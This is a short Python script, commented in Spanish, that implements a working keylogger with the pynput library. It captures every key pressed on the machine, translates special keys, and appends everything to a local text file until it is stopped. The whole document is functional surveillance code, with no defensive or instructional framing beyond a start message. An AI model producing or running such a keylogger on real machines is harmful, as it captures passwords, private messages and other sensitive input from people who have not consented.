from pynput.keyboard import Listener

# El archivo donde se guardarán las teclas
archivo_log = "registro_teclas.txt"

def al_presionar(tecla):
    # Traducimos la tecla pulsada a texto
    tecla_str = str(tecla).replace("'", "")
    
    # Manejo de teclas especiales (espacio, enter, etc.)
    if tecla_str == "Key.space":
        tecla_str = " "
    elif tecla_str == "Key.enter":
        tecla_str = "\n"
    elif "Key" in tecla_str:
        tecla_str = f" [{tecla_str}] "

    # Escribimos en el archivo de forma automática
    with open(archivo_log, "a") as f:
        f.write(tecla_str)

# Esto inicia la "escucha" del teclado
print("Iniciando registro... (Presiona Ctrl+C en la terminal para detener)")
with Listener(on_press=al_presionar) as escuchador:
    escuchador.join()